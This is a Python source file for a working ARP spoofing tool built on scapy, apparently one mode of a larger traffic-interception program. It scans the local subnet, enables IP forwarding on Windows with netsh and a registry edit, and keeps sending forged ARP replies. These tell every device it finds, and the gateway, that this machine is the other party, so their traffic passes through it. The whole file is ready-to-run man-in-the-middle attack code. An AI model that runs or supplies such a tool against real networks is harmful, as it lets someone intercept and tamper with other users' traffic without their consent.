"""
Mode B — ARP Spoofer
Sends ARP replies to trick devices into routing traffic through this machine.
No router access needed. Requires Npcap and Administrator privileges.
"""
import threading
import time
import logging
import subprocess
import sys

from scapy.all import (
    ARP, Ether, sendp, getmacbyip, get_if_hwaddr, conf, srp
)

from config import GATEWAY_IP, INTERFACE, ARP_SPOOF_INTERVAL, ARP_TARGETS, NETWORK_CIDR

logger = logging.getLogger("arp_spoofer")


class ARPSpoofer:
    """ARP spoofing engine that redirects network traffic through this machine."""

    def __init__(self):
        self._running = False
        self._thread = None
        self.gateway_ip = GATEWAY_IP
        self.gateway_mac = None
        self.targets = {}  # {ip: mac}
        self._iface = INTERFACE

    def _get_mac(self, ip: str) -> str:
        """Get MAC address for an IP via ARP request."""
        mac = getmacbyip(ip)
        if mac:
            return mac
        # Fallback: send ARP request with scapy
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            timeout=3, verbose=False, iface=self._iface
        )
        if ans:
            return ans[0][1].hwsrc
        return None

    def _enable_ip_forwarding(self):
        """Enable IP forwarding on Windows so traffic flows through."""
        try:
            subprocess.run(
                ["netsh", "interface", "ipv4", "set", "interface",
                 self._iface, "forwarding=enabled"],
                check=True, capture_output=True
            )
            logger.info("IP forwarding enabled.")
        except subprocess.CalledProcessError as e:
            logger.warning(f"Could not enable IP forwarding via netsh: {e}")
            # Fallback: registry method
            try:
                subprocess.run(
                    ["reg", "add",
                     r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                     "/v", "IPEnableRouter", "/t", "REG_DWORD", "/d", "1", "/f"],
                    check=True, capture_output=True
                )
                logger.info("IP forwarding enabled via registry (may need reboot).")
            except Exception as e2:
                logger.error(f"Failed to enable IP forwarding: {e2}")

    def _disable_ip_forwarding(self):
        """Disable IP forwarding."""
        try:
            subprocess.run(
                ["netsh", "interface", "ipv4", "set", "interface",
                 self._iface, "forwarding=disabled"],
                capture_output=True
            )
        except Exception:
            pass

    def _discover_targets(self):
        """Discover devices on the network if no specific targets are set."""
        if ARP_TARGETS:
            for ip in ARP_TARGETS:
                mac = self._get_mac(ip)
                if mac:
                    self.targets[ip] = mac
                    logger.info(f"Target: {ip} ({mac})")
                else:
                    logger.warning(f"Could not resolve MAC for {ip}")
        else:
            logger.info(f"Scanning network {NETWORK_CIDR} for targets...")
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=NETWORK_CIDR),
                timeout=5, verbose=False, iface=self._iface
            )
            for sent, received in ans:
                ip = received.psrc
                mac = received.hwsrc
                if ip != self.gateway_ip:
                    self.targets[ip] = mac
            logger.info(f"Discovered {len(self.targets)} devices to spoof.")

    def _spoof(self, target_ip: str, target_mac: str):
        """Send a single ARP spoof packet to a target."""
        # Tell target: "I am the gateway"
        pkt = Ether(dst=target_mac) / ARP(
            op=2,  # is-at (reply)
            pdst=target_ip,
            hwdst=target_mac,
            psrc=self.gateway_ip,
        )
        sendp(pkt, verbose=False, iface=self._iface)

        # Tell gateway: "I am the target"
        pkt2 = Ether(dst=self.gateway_mac) / ARP(
            op=2,
            pdst=self.gateway_ip,
            hwdst=self.gateway_mac,
            psrc=target_ip,
        )
        sendp(pkt2, verbose=False, iface=self._iface)

    def _restore(self, target_ip: str, target_mac: str):
        """Restore the original ARP mappings for a target."""
        # Tell target the real gateway MAC
        pkt = Ether(dst=target_mac) / ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=self.gateway_ip,
            hwsrc=self.gateway_mac,
        )
        sendp(pkt, count=3, verbose=False, iface=self._iface)

        # Tell gateway the real target MAC
        pkt2 = Ether(dst=self.gateway_mac) / ARP(
            op=2,
            pdst=self.gateway_ip,
            hwdst=self.gateway_mac,
            psrc=target_ip,
            hwsrc=target_mac,
        )
        sendp(pkt2, count=3, verbose=False, iface=self._iface)

    def _spoof_loop(self):
        """Main loop: continuously send spoof packets."""
        while self._running:
            for ip, mac in list(self.targets.items()):
                if not self._running:
                    break
                try:
                    self._spoof(ip, mac)
                except Exception as e:
                    logger.error(f"Spoof error for {ip}: {e}")
            time.sleep(ARP_SPOOF_INTERVAL)

    def start(self):
        """Start ARP spoofing."""
        logger.info("Starting ARP spoofer...")

        # Resolve gateway MAC
        self.gateway_mac = self._get_mac(self.gateway_ip)
        if not self.gateway_mac:
            logger.error(f"Cannot resolve gateway MAC for {self.gateway_ip}. Aborting.")
            return False

        logger.info(f"Gateway: {self.gateway_ip} ({self.gateway_mac})")

        # Enable IP forwarding
        self._enable_ip_forwarding()

        # Discover targets
        self._discover_targets()
        if not self.targets:
            logger.warning("No targets found. ARP spoofer has nothing to do.")
            return False

        # Start spoofing thread
        self._running = True
        self._thread = threading.Thread(target=self._spoof_loop, daemon=True)
        self._thread.start()
        logger.info(f"ARP spoofer running — spoofing {len(self.targets)} devices.")
        return True

    def stop(self):
        """Stop ARP spoofing and restore ARP tables."""
        logger.info("Stopping ARP spoofer — restoring ARP tables...")
        self._running = False
        if self._thread:
            self._thread.join(timeout=10)

        # Restore all targets
        for ip, mac in self.targets.items():
            try:
                self._restore(ip, mac)
                logger.info(f"Restored ARP for {ip}")
            except Exception as e:
                logger.error(f"Failed to restore {ip}: {e}")

        self._disable_ip_forwarding()
        logger.info("ARP spoofer stopped.")

    def refresh_targets(self):
        """Re-scan the network and update target list."""
        old_count = len(self.targets)
        self._discover_targets()
        new_count = len(self.targets)
        logger.info(f"Target refresh: {old_count} -> {new_count} devices")
        return self.targets

    @property
    def is_running(self) -> bool:
        return self._running

    def get_target_list(self):
        """Return current spoof targets."""
        return dict(self.targets)
